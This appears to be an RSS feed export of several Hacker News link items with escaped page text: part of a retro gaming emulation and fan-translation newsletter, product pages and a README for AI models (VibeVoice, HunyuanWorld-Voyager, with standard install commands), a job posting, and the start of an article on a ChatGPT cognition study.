    &lt;p&gt;He's now looking into the prospect of preserving the PC Engine PAC, which will ‚Äî fingers crossed ‚Äî not be too much more complicated than plugging Ares' existing PC Engine CD code into the new LaserActive code. But that's a story for another day.&lt;/p&gt;
    &lt;p&gt;For now, the emulation code being out in the wild represents relief most of all. "It was a long journey, with a lot of false starts and wrong turns getting to that point," Nemesis says. "A lot of it was work and time which nobody else had been able to see. I don't keep a blog. I don't tend to share the various steps I take to make something or get something working, I only tend to reach out when I have something to share or when I'm asking for help from other people.&lt;/p&gt;
    &lt;p&gt;"A lot of my time and energy had gone into this system over the years, and it was good to finally be able to show something for all that work."&lt;/p&gt;
    &lt;head rend="h3"&gt;2. Let's kick the beat: a Cowboy Bebop video game in English at long last&lt;/head&gt;
    &lt;p&gt;If there was any anime game you'd think had a sure shot at being released in English in the early 2000s, how could it be anything but Cowboy Bebop? The breakthrough "not every anime is Dragon Ball Z" series was a huge hit on Cartoon Network, channeled the American jazz of Art Blakey, and even saw a then-rare theatrical run for its movie spin-off. But neither its PlayStation 1 or PlayStation 2 games ever made it out of Japan.&lt;/p&gt;
    &lt;p&gt;*Hard bop drum roll*&lt;/p&gt;
    &lt;p&gt;...Until now! I'm delighted that translator Sonicman69, along with an anonymous hacker, has brought the PS2 beat 'em up Cowboy Bebop: Tsuioku no Serenade to English players to celebrate the game's 20th anniversary. Regular ROM readers may remember Sonicman69's translation of a Detective Conan PlayStation 2 game featured last year, both prime examples of a period when games based on popular anime were still far from a sure thing localization-wise.&lt;/p&gt;
    &lt;p&gt;Well, for Conan that may unfortunately still be the case, as I don't know if the boy-sized genius has ever really made it in America. But I'm pretty sure a Cowboy Bebop game released in 2025 would be targeting English-speaking audiences even before Japanese ones. As I theorized earlier this week on PC Gamer, Tsuioku no Serenade's developer Bandai merging with Namco right around the time this game was being released may be the culprit ‚Äî the ensuing corporate chaos of layoffs and reorganizations could easily have killed it in the cradle.&lt;/p&gt;
    &lt;p&gt;I haven't had a chance to play Tsuioku no Serenade myself despite being lucky enough to track down a (seemingly somewhat rare, now) copy, but general consensus is it's an okay brawler but quite a nice little Bebop sidestory with some handsome late-era PS2 graphics. And there's original Yoko Kanno music, so, like, what else do you really want?&lt;/p&gt;
    &lt;p&gt;I reached out to translator Sonicman69 for a bit of insight into the translation effort, who first watched Bebop around 2014 and learned later that the game had never been released in English. "From that exact moment I felt like I could be the one to do it," he said. "Keep in mind at this time I knew maybe three words in Japanese and was still in high school. Big expectations. I figured someone else would get around to it eventually."&lt;/p&gt;
    &lt;p&gt;But they didn't, so after off-and-on attempts to learn Japanese and gaining some translation and editing experience contributing to the Conan patch, he set sights on Bebop with the aim of finishing the patch by the game's 20th anniversary:&lt;/p&gt;
    &lt;quote&gt;I'd say the most challenging thing that people don't really think about is how often text would be reused at different points in the game. Trying to figure out a translation for a sentence that works in one context that also has to work in another ‚Äî Conan had this a little bit but it was a lot more annoying with Bebop and frankly I don't think I nailed it. Aside from that the interstitials between scenes are poetic and I'm still a Japanese novice and have no poetic ability at all so I had a tough time at those and I think they came out kind of bad.&lt;lb/&gt;I am admittedly a little apologetic about the quality of the translation, I've received unanimous praise so far but I know I could have done better if I studied more but if I didn't translate the game now it would have never happened at all. What I'm most proud of aside from the fact we actually got it done and released it in time for the 20th anniversary? People keep telling me I did a good job writing the lines for the characters in a way that stays true to how they talked in the English dub of the show. I'm hesitant to accept that since I'm pretty critical of it myself but if I really was able to capture the characters then I did my job."&lt;/quote&gt;
    &lt;p&gt;Sonicman69 also argues that the game is "not a simple button mashing beat 'em up due to how deep the combat actually is," but some annoying tutorials and the language barrier made it easy to write off. Take it from the person who's beaten it a dozen times: it's worth playing. "As far as how well the story captures the vibe of the show I think they did a pretty admirable job, but obviously it's never going to get anywhere near the best scenes from the show. Any Bebop fan who wishes there was just a little bit more to chew on should at least enjoy the game a little bit. Especially the bonus mode you unlock after completing the game on normal but I don't want to spoil too much."&lt;/p&gt;
    &lt;p&gt;You can find the English patch on Github and throw a few bucks to Sonicman69 on Ko-fi if you appreciate getting to spend a little more time in the Bebopverse after all these years.&lt;/p&gt;
    &lt;head rend="h2"&gt;Patching In&lt;/head&gt;
    &lt;p&gt;Sometimes emudev is all about fixing a texture issue in Colin McRae Rally 2005 ‚Äì I always try to look into random Github commits with names I don't understand to see what they're all about, and sometimes PCSX2 being update to "Handle texture shuffle with pixel reversals" is just about adding some code to ignore when a game is flipping pixels horizontally and then flipping them back again because it screwed things up. Specifically it screwed up the roads in Colin McRae Rally 2005, and seemingly only Colin McRae Rally 2005.&lt;/p&gt;
    &lt;p&gt;bsnes updated with latest version of SameBoy ‚Äì I think it's wonderful that Near's Super Nintendo emulator is still being maintained, and this is a nice update. bsnes uses an integrated version of SameBoy for accurate Super Game Boy emulation, but it was out of date with that emulator's continued development. No longer! All synced up.&lt;/p&gt;
    &lt;p&gt;Deeply customizable PC emulator 86Box hits 5.0 ‚Äì If you want to create a virtual PC down to the motherboard, sound card, and BIOS you had on the family PC back in like 1996, 86Box is your jam. And it's just gotten its first meaty release since September 2024, with version 5.0 including a lengthy list of additions and fixes plus "a preview for one of the most requested 86Box features of all time: an integrated machine manager to organize all your emulated setups." Other highlights: "much smoother" mouse input and display output on high refresh monitors; support for CRT emulation shader effects; new systems including some early Japanese PC-compatibles; and dark mode support on Windows.&lt;/p&gt;
    &lt;head rend="h2"&gt;Core Report&lt;/head&gt;
    &lt;p&gt;Call me Mr. Turbo CD + Graphics ‚Äì The MiSTer's PC Engine / Turbografx core just got a notable update with work from contributor David Shadoff that's been gestating for the last few months: support for CD+G, "a special audio CD that contains graphics data in addition to the audio data on the disc," according to Sega Retro. "The disc can be played on a regular audio CD player, but when played on a special CD+G player, can also output a graphics signal. CD+G is most commonly seen used for karaoke and slideshows."&lt;/p&gt;
    &lt;p&gt;The MiSTer's Commodore 64 core now also notably supports writing to Easyflash carts and "Waterloo Structured BASIC and BMP-Data Turbo 2000."&lt;/p&gt;
    &lt;p&gt;Surprise! (Attack) ‚Äì Jotego dropped a core for this Konami arcade sidescroller for MiSTer and Analogue Pocket this week, along with a bit of deserved braggadocio about nailing some specific graphic effects that aren't correctly emulated in MAME. Sweat those details! Also, I'd just like to point out that Surprise Attack has some absolutely sick flyer artwork.&lt;/p&gt;
    &lt;head rend="h2"&gt;Translation Station&lt;/head&gt;
    &lt;p&gt;Sword &amp;amp; Sorcery &amp;amp; English ‚Äì You might think Bebop would be a big enough deal that the Translation Station could take the rest of the week off, but nope ‚Äî trains are still runnin'! Hit the link for a making-of at great fansite Sega Saturn Shiro from one of the contributors to this project for the 1996 JRPG. Note that it's an in-progress patch, rather than a finished one you'll want to leap to play right now; this is more of a "get excited" mention (and a fun read) which I'll no doubt circle back to in the future.&lt;/p&gt;
    &lt;p&gt;Psychic Killer, Fa-fa-fa-fa, fa-fa-fa-fa ‚Äì It's a Shiro two-fer this week! This translation of Psychic Killer Taromaru is a 1.0 you can grab on Github and was cranked out in just a month using Saturn emulator Yaba Sanshiro. It's a sidescrilling action game in which you, a ninja, "fire psychic energy at demons to save a kidnapped girl in feudal Japan," says Shiro. The translation was inspired by this video from Dungeon Chill, who called it a hidden gem. Well, it ain't hidden anymore. You can see it right here. Not very subtle, ninja.&lt;/p&gt;
    &lt;p&gt;If you ever wanted to play Clock Tower on the WonderSwan... ‚Äì Then here's a translation for you. This patch ports the Aeon Genesis team's translation over to the WonderSwan release of the original Super Nintendo horror game. Maybe it's scarier in low-res black and white?&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114003</guid></item><item><title>Microsoft VibeVoice: A Frontier Open-Source Text-to-Speech Model</title><link>https://microsoft.github.io/VibeVoice/</link><description>&lt;doc fingerprint="945992cd871ba186"&gt;
  &lt;main&gt;
    &lt;p&gt;üìÑ Report ¬∑ Code ¬∑ ü§ó Hugging Face ¬∑ Demo&lt;/p&gt;
    &lt;p&gt;VibeVoice is a novel framework designed for generating expressive, long-form, multi-speaker conversational audio, such as podcasts, from text. It addresses significant challenges in traditional Text-to-Speech (TTS) systems, particularly in scalability, speaker consistency, and natural turn-taking. A core innovation of VibeVoice is its use of continuous speech tokenizers (Acoustic and Semantic) operating at an ultra-low frame rate of 7.5 Hz. These tokenizers efficiently preserve audio fidelity while significantly boosting computational efficiency for processing long sequences. VibeVoice employs a next-token diffusion framework, leveraging a Large Language Model (LLM) to understand textual context and dialogue flow, and a diffusion head to generate high-fidelity acoustic details. The model can synthesize speech up to 90 minutes long with up to 4 distinct speakers, surpassing the typical 1-2 speaker limits of many prior models.&lt;/p&gt;
    &lt;p&gt;* Timestamps are derived from the generated audio and may contain errors.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114245</guid></item><item><title>Energy Dashboard (UK)</title><link>https://www.energydashboard.co.uk/map</link><description>&lt;doc fingerprint="4a7f863e13d2be18"&gt;
  &lt;main&gt;
    &lt;p&gt;Map Live Historical Map Support Site Data Sources Contact Access Data Energy Dashboard Map Live Historical Map Support the Site Data Sources Contact Access the Data&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114277</guid></item><item><title>Tencent Open Sourced a 3D World Model</title><link>https://github.com/Tencent-Hunyuan/HunyuanWorld-Voyager</link><description>&lt;doc fingerprint="6471995901b3f389"&gt;
  &lt;main&gt;
    &lt;p&gt;We introduce HunyuanWorld-Voyager, a novel video diffusion framework that generates world-consistent 3D point-cloud sequences from a single image with user-defined camera path. Voyager can generate 3D-consistent scene videos for world exploration following custom camera trajectories. It can also generate aligned depth and RGB video for efficient and direct 3D reconstruction.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Sep 2, 2025: üëã We release the code and model weights of HunyuanWorld-Voyager. Download.&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;Join our Wechat and Discord group to discuss and find help from us.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Wechat Group&lt;/cell&gt;
        &lt;cell role="head"&gt;Xiaohongshu&lt;/cell&gt;
        &lt;cell role="head"&gt;X&lt;/cell&gt;
        &lt;cell role="head"&gt;Discord&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head class="px-3 py-2"&gt;demo.mp4&lt;/head&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Input&lt;/cell&gt;
        &lt;cell role="head"&gt;Generated Video&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;head&gt;output.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;head&gt;output7.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;output9.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Video Reconstruction&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Generated Video&lt;/cell&gt;
        &lt;cell role="head"&gt;Reconstructed Point Cloud&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;output1.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;output2.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Image-to-3D Generation&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;output5.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;output11.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Video Depth Estimation&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;head&gt;depth.mp4&lt;/head&gt;
        &lt;/cell&gt;
        &lt;cell&gt;
          &lt;head&gt;depth2.mp4&lt;/head&gt;
        &lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Voyager consists of two key components:&lt;/p&gt;
    &lt;p&gt;(1) World-Consistent Video Diffusion: A unified architecture that jointly generates aligned RGB and depth video sequences, conditioned on existing world observation to ensure global coherence.&lt;/p&gt;
    &lt;p&gt;(2) Long-Range World Exploration: An efficient world cache with point culling and an auto-regressive inference with smooth video sampling for iterative scene extension with context-aware consistency.&lt;/p&gt;
    &lt;p&gt;To train Voyager, we propose a scalable data engine, i.e., a video reconstruction pipeline that automates camera pose estimation and metric depth prediction for arbitrary videos, enabling large-scale, diverse training data curation without manual 3D annotations. Using this pipeline, we compile a dataset of over 100,000 video clips, combining real-world captures and synthetic Unreal Engine renders.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="9"&gt;
        &lt;cell role="head"&gt;Method&lt;/cell&gt;
        &lt;cell role="head"&gt;WorldScore Average&lt;/cell&gt;
        &lt;cell role="head"&gt;Camera Control&lt;/cell&gt;
        &lt;cell role="head"&gt;Object Control&lt;/cell&gt;
        &lt;cell role="head"&gt;Content Alignment&lt;/cell&gt;
        &lt;cell role="head"&gt;3D Consistency&lt;/cell&gt;
        &lt;cell role="head"&gt;Photometric Consistency&lt;/cell&gt;
        &lt;cell role="head"&gt;Style Consistency&lt;/cell&gt;
        &lt;cell role="head"&gt;Subjective Quality&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;WonderJourney&lt;/cell&gt;
        &lt;cell&gt;üü°63.75&lt;/cell&gt;
        &lt;cell&gt;üü°84.6&lt;/cell&gt;
        &lt;cell&gt;37.1&lt;/cell&gt;
        &lt;cell&gt;35.54&lt;/cell&gt;
        &lt;cell&gt;80.6&lt;/cell&gt;
        &lt;cell&gt;79.03&lt;/cell&gt;
        &lt;cell&gt;62.82&lt;/cell&gt;
        &lt;cell&gt;üü¢66.56&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;WonderWorld&lt;/cell&gt;
        &lt;cell&gt;üü¢72.69&lt;/cell&gt;
        &lt;cell&gt;üî¥92.98&lt;/cell&gt;
        &lt;cell&gt;51.76&lt;/cell&gt;
        &lt;cell&gt;üî¥71.25&lt;/cell&gt;
        &lt;cell&gt;üî¥86.87&lt;/cell&gt;
        &lt;cell&gt;85.56&lt;/cell&gt;
        &lt;cell&gt;70.57&lt;/cell&gt;
        &lt;cell&gt;49.81&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;EasyAnimate&lt;/cell&gt;
        &lt;cell&gt;52.85&lt;/cell&gt;
        &lt;cell&gt;26.72&lt;/cell&gt;
        &lt;cell&gt;54.5&lt;/cell&gt;
        &lt;cell&gt;50.76&lt;/cell&gt;
        &lt;cell&gt;67.29&lt;/cell&gt;
        &lt;cell&gt;47.35&lt;/cell&gt;
        &lt;cell&gt;üü°73.05&lt;/cell&gt;
        &lt;cell&gt;50.31&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;Allegro&lt;/cell&gt;
        &lt;cell&gt;55.31&lt;/cell&gt;
        &lt;cell&gt;24.84&lt;/cell&gt;
        &lt;cell&gt;üü°57.47&lt;/cell&gt;
        &lt;cell&gt;üü°51.48&lt;/cell&gt;
        &lt;cell&gt;70.5&lt;/cell&gt;
        &lt;cell&gt;69.89&lt;/cell&gt;
        &lt;cell&gt;65.6&lt;/cell&gt;
        &lt;cell&gt;47.41&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;Gen-3&lt;/cell&gt;
        &lt;cell&gt;60.71&lt;/cell&gt;
        &lt;cell&gt;29.47&lt;/cell&gt;
        &lt;cell&gt;üü¢62.92&lt;/cell&gt;
        &lt;cell&gt;50.49&lt;/cell&gt;
        &lt;cell&gt;68.31&lt;/cell&gt;
        &lt;cell&gt;üü¢87.09&lt;/cell&gt;
        &lt;cell&gt;62.82&lt;/cell&gt;
        &lt;cell&gt;üü°63.85&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="9"&gt;
        &lt;cell&gt;CogVideoX-I2V&lt;/cell&gt;
        &lt;cell&gt;62.15&lt;/cell&gt;
        &lt;cell&gt;38.27&lt;/cell&gt;
        &lt;cell&gt;40.07&lt;/cell&gt;
        &lt;cell&gt;36.73&lt;/cell&gt;
        &lt;cell&gt;üü¢86.21&lt;/cell&gt;
        &lt;cell&gt;üî¥88.12&lt;/cell&gt;
        &lt;cell&gt;üü¢83.22&lt;/cell&gt;
        &lt;cell&gt;62.44&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Voyager&lt;/cell&gt;
        &lt;cell&gt;üî¥77.62&lt;/cell&gt;
        &lt;cell&gt;üü¢85.95&lt;/cell&gt;
        &lt;cell&gt;üî¥66.92&lt;/cell&gt;
        &lt;cell&gt;üü¢68.92&lt;/cell&gt;
        &lt;cell&gt;üü°81.56&lt;/cell&gt;
        &lt;cell&gt;üü°85.99&lt;/cell&gt;
        &lt;cell&gt;üî¥84.89&lt;/cell&gt;
        &lt;cell&gt;üî¥71.09&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;The following table shows the requirements for running Voyager (batch size = 1) to generate videos:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Model&lt;/cell&gt;
        &lt;cell role="head"&gt;Resolution&lt;/cell&gt;
        &lt;cell role="head"&gt;GPU Peak Memory&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;HunyuanWorld-Voyager&lt;/cell&gt;
        &lt;cell&gt;540p&lt;/cell&gt;
        &lt;cell&gt;60GB&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;An NVIDIA GPU with CUDA support is required. &lt;list rend="ul"&gt;&lt;item&gt;The model is tested on a single 80G GPU.&lt;/item&gt;&lt;item&gt;Minimum: The minimum GPU memory required is 60GB for 540p.&lt;/item&gt;&lt;item&gt;Recommended: We recommend using a GPU with 80GB of memory for better generation quality.&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
      &lt;item&gt;Tested operating system: Linux&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Begin by cloning the repository:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/Tencent-Hunyuan/HunyuanWorld-Voyager
cd HunyuanWorld-Voyager&lt;/code&gt;
    &lt;p&gt;We recommend CUDA versions 12.4 or 11.8 for the manual installation.&lt;/p&gt;
    &lt;code&gt;# 1. Create conda environment
conda create -n voyager python==3.11.9

# 2. Activate the environment
conda activate voyager

# 3. Install PyTorch and other dependencies using conda
# For CUDA 12.4
conda install pytorch==2.4.0 torchvision==0.19.0 torchaudio==2.4.0 pytorch-cuda=12.4 -c pytorch -c nvidia

# 4. Install pip dependencies
python -m pip install -r requirements.txt
python -m pip install transformers==4.39.3

# 5. Install flash attention v2 for acceleration (requires CUDA 11.8 or above)
python -m pip install flash-attn

# 6. Install xDiT for parallel inference (It is recommended to use torch 2.4.0 and flash-attn 2.6.3)
python -m pip install xfuser==0.4.2&lt;/code&gt;
    &lt;p&gt;In case of running into float point exception(core dump) on the specific GPU type, you may try the following solutions:&lt;/p&gt;
    &lt;code&gt;# Making sure you have installed CUDA 12.4, CUBLAS&amp;gt;=12.4.5.8, and CUDNN&amp;gt;=9.00 (or simply using our CUDA 12 docker image).
pip install nvidia-cublas-cu12==12.4.5.8
export LD_LIBRARY_PATH=/opt/conda/lib/python3.8/site-packages/nvidia/cublas/lib/&lt;/code&gt;
    &lt;p&gt;To create your own input conditions, you also need to install the following dependencies:&lt;/p&gt;
    &lt;code&gt;pip install --no-deps git+https://github.com/microsoft/MoGe.git
pip install scipy==1.11.4
pip install git+https://github.com/EasternJournalist/utils3d.git@c5daf6f6c244d251f252102d09e9b7bcef791a38&lt;/code&gt;
    &lt;p&gt;A detailed guidance for downloading pretrained models is shown here. Briefly,&lt;/p&gt;
    &lt;code&gt;huggingface-cli download tencent/HunyuanWorld-Voyager --local-dir ./ckpts
&lt;/code&gt;
    &lt;p&gt;We provide several input examples in the &lt;code&gt;examples&lt;/code&gt; folder. You can find the corresponding input text in the &lt;code&gt;prompt.txt&lt;/code&gt; file. If you'd like to use your own input image, you can run the following command:&lt;/p&gt;
    &lt;code&gt;cd data_engine

python3 create_input.py --image_path "your_input_image" --render_output_dir "examples/case/" --type "forward"&lt;/code&gt;
    &lt;p&gt;We provide the following types of camera path:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;forward&lt;/item&gt;
      &lt;item&gt;backward&lt;/item&gt;
      &lt;item&gt;left&lt;/item&gt;
      &lt;item&gt;right&lt;/item&gt;
      &lt;item&gt;turn_left&lt;/item&gt;
      &lt;item&gt;turn_right You can also modify the camera path in the &lt;code&gt;create_input.py&lt;/code&gt;file.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

python3 sample_image2video.py \
    --model HYVideo-T/2 \
    --input-path "examples/case1" \
    --prompt "An old-fashioned European village with thatched roofs on the houses." \
    --i2v-stability \
    --infer-steps 50 \
    --flow-reverse \
    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --use-cpu-offload \
    --save-path ./results&lt;/code&gt;
    &lt;p&gt;You can add "--use-context-block" to add the context block in the inference.&lt;/p&gt;
    &lt;p&gt;xDiT is a Scalable Inference Engine for Diffusion Transformers (DiTs) on multi-GPU Clusters. It has successfully provided low-latency parallel inference solutions for a variety of DiTs models, including mochi-1, CogVideoX, Flux.1, SD3, etc. This repo adopted the Unified Sequence Parallelism (USP) APIs for parallel inference of the HunyuanVideo-I2V model.&lt;/p&gt;
    &lt;p&gt;For example, to generate a video with 8 GPUs, you can use the following command:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

ALLOW_RESIZE_FOR_SP=1 torchrun --nproc_per_node=8 \
    sample_image2video.py \
    --model HYVideo-T/2 \
    --input-path "examples/case1" \
    --prompt "An old-fashioned European village with thatched roofs on the houses." \
    --i2v-stability \
    --infer-steps 50 \
    --flow-reverse \
    --flow-shift 7.0 \
    --seed 0 \
    --embedded-cfg-scale 6.0 \
    --save-path ./results \
    --ulysses-degree 8 \
    --ring-degree 1&lt;/code&gt;
    &lt;p&gt;The number of GPUs equals the product of &lt;code&gt;--ulysses-degree&lt;/code&gt; and &lt;code&gt;--ring-degree.&lt;/code&gt; Feel free to adjust these parallel configurations to optimize performance.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="4"&gt;
        &lt;cell role="head"&gt;Latency (Sec) for 512x768 (49 frames 50 steps) on 8 x H20 GPU&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="4"&gt;
        &lt;cell&gt;1&lt;/cell&gt;
        &lt;cell&gt;2&lt;/cell&gt;
        &lt;cell&gt;4&lt;/cell&gt;
        &lt;cell&gt;8&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;1925&lt;/cell&gt;
        &lt;cell&gt;1018 (1.89x)&lt;/cell&gt;
        &lt;cell&gt;534 (3.60x)&lt;/cell&gt;
        &lt;cell&gt;288 (6.69x)&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;We also provide a Gradio demo for the HunyuanWorld-Voyager model.&lt;/p&gt;
    &lt;p&gt;You can run the following command to start the demo:&lt;/p&gt;
    &lt;code&gt;cd HunyuanWorld-Voyager

python3 app.py&lt;/code&gt;
    &lt;p&gt;You need to first upload an image and choose a camera direction to create a condition video. Then, you can type your text prompt and generate the final RGB-D video.&lt;/p&gt;
    &lt;p&gt;We also release the data engine of HunyuanWorld-Voyager, which can be used to generate scalable data for RGB-D video training. Please refer to data_engine for more details.&lt;/p&gt;
    &lt;p&gt;If you find Voyager useful for your research and applications, please cite using this BibTeX:&lt;/p&gt;
    &lt;code&gt;@article{huang2025voyager,
  title={Voyager: Long-Range and World-Consistent Video Diffusion for Explorable 3D Scene Generation},
  author={Huang, Tianyu and Zheng, Wangguandong and Wang, Tengfei and Liu, Yuhao and Wang, Zhenwei and Wu, Junta and Jiang, Jie and Li, Hui and Lau, Rynson WH and Zuo, Wangmeng and Guo, Chunchao},
  journal={arXiv preprint arXiv:2506.04225},
  year={2025}
}&lt;/code&gt;
    &lt;p&gt;We would like to thank HunyuanWorld, Hunyuan3D-2, and HunyuanVideo-I2V. We also thank VGGT, MoGE, Metric3D, for their open research and exploration.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114379</guid></item><item><title>Dynamo AI (YC W22) Is Hiring for AI Product Managers</title><link>https://www.ycombinator.com/companies/dynamo-ai/jobs/tt5OVwf-product-manager-ai</link><description>&lt;doc fingerprint="6b129ed5acbf284e"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;head rend="h1"&gt;Product Manager - AI&lt;/head&gt;
      &lt;p&gt;Location: Remote (US-based preferred)&lt;lb/&gt; Experience: 1+ years in Product Management&lt;/p&gt;
      &lt;head rend="h3"&gt;About Dynamo AI&lt;/head&gt;
      &lt;p&gt;Dynamo AI is building the future of trustworthy AI for the enterprise. Our platform provides real-time guardrails, redteaming, and observability for generative AI systems‚Äîensuring safe, compliant, and reliable AI deployments in regulated industries such as financial services, insurance, DoD, and healthcare.&lt;/p&gt;
      &lt;p&gt;We‚Äôre backed by leading partners and rapidly expanding with some of the world‚Äôs most sophisticated enterprises.&lt;/p&gt;
      &lt;head rend="h3"&gt;The Role&lt;/head&gt;
      &lt;p&gt;We‚Äôre seeking an AI Product Manager who will own the vision and execution of new product directions in trustworthy AI. You will work closely with our founders, engineers, and enterprise partners to identify high-impact opportunities, shape product roadmaps, and deliver solutions that set the standard for safe and scalable AI adoption.&lt;/p&gt;
      &lt;p&gt;This role is ideal for a builder excited to drive the future of AI governance, safety, and compliance.&lt;/p&gt;
      &lt;head rend="h3"&gt;Responsibilities&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Define and lead product strategy for Dynamo AI‚Äôs redteaming, guardrails, and observability solutions.&lt;/item&gt;
        &lt;item&gt;Collaborate with engineering and research teams to translate customer requirements into product roadmaps.&lt;/item&gt;
        &lt;item&gt;Engage directly with enterprise partners in regulated industries to pilot and deploy solutions.&lt;/item&gt;
        &lt;item&gt;Monitor AI regulatory and compliance landscapes to ensure our products stay ahead of industry needs.&lt;/item&gt;
        &lt;item&gt;Drive rapid iteration, from concept to launch, ensuring measurable business and user impact.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Requirements&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;1+ years of experience in a Product Management role (preferably in enterprise software, AI/ML, or adjacent fields).&lt;/item&gt;
        &lt;item&gt;Strong communication skills and the ability to work cross-functionally with technical and non-technical stakeholders.&lt;/item&gt;
        &lt;item&gt;Demonstrated ability to translate complex technologies into actionable product directions.&lt;/item&gt;
        &lt;item&gt;Entrepreneurial mindset: comfortable with ambiguity, speed, and high-growth environments.&lt;/item&gt;
        &lt;item&gt;Passion for AI safety, trustworthy AI, and building responsible technology.&lt;/item&gt;
      &lt;/list&gt;
      &lt;head rend="h3"&gt;Why Join Us&lt;/head&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;Work at the forefront of generative AI safety and compliance.&lt;/item&gt;
        &lt;item&gt;Partner with Fortune 500 and leading global enterprises on real-world deployments.&lt;/item&gt;
        &lt;item&gt;Be part of a fast-moving, founder-led startup with opportunities for outsized impact.&lt;/item&gt;
        &lt;item&gt;Competitive compensation, equity, and benefits.&lt;/item&gt;
      &lt;/list&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45114715</guid></item><item><title>MIT Study Finds AI Use Reprograms the Brain, Leading to Cognitive Decline</title><link>https://publichealthpolicyjournal.com/mit-study-finds-artificial-intelligence-use-reprograms-the-brain-leading-to-cognitive-decline/</link><description>&lt;doc fingerprint="3e0b7db1eb656f24"&gt;
  &lt;main&gt;
    &lt;p&gt;A new MIT study titled, Your Brain on ChatGPT: Accumulation of Cognitive Debt when Using an AI Assistant for Essay Writing Task, has found that using ChatGPT to help write essays leads to long-term cognitive harm‚Äîmeasurable through EEG brain scans. Students who repeatedly relied on ChatGPT showed weakened neural connectivity, impaired memory recall, and diminished sense of ownership over their own writing. While the AI-generated content often scored well, the brains behind it were shutting down.&lt;/p&gt;
    &lt;p&gt;The findings are clear: Large Language Models (LLMs) like ChatGPT and Grok don‚Äôt just help students write‚Äîthey train the brain to disengage. Here‚Äôs what the researchers found:&lt;/p&gt;
    &lt;head rend="h4"&gt;Brain Connectivity Declines with AI Use&lt;/head&gt;
    &lt;list rend="ul"&gt;
